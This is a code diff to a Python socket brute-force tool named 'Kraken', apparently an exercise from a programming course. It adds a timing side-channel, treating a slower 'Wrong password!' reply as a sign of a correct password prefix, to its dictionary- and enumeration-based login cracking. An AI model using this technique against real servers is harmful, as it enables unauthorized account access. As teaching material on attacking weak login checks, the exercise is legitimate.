@@ -3,6 +3,7 @@ import argparse
 import itertools
 import string
 import json
+import time
 
 
 parser = argparse.ArgumentParser()
@@ -26,6 +27,7 @@ class Kraken:
     _wrong_pass = json.dumps({"result": "Wrong password!"})
     _except = json.dumps({"result": "Exception happened during login"})
     _success = json.dumps({"result": "Connection success!"})
+    _past_time = 0
 
     def __init__(self):
         self.address = (args.ip_address, int(args.port))
@@ -66,6 +68,9 @@ class Kraken:
                     if self._decoded_response == self._except:
                         self._current_pass = self._current_login["password"]
                         break
+                    elif self._past_time > 0.1000 and self._decoded_response == self._wrong_pass:
+                        self._current_pass = self._current_login["password"]
+                        break
 
     def load_pass(self):
         with open('passwords.txt', 'r', encoding='utf-8') as passwords:
@@ -79,8 +84,11 @@ class Kraken:
 
     def try_bite(self, client: socket.socket, word: str):
         data = word.encode('utf8')
+        start_time = time.time()
         client.send(data)
         response = client.recv(1024)
+        end_time = time.time()
+        self._past_time = end_time - start_time
         self._decoded_response = response.decode('utf8')
 
         if self._decoded_response == "Wrong password!":
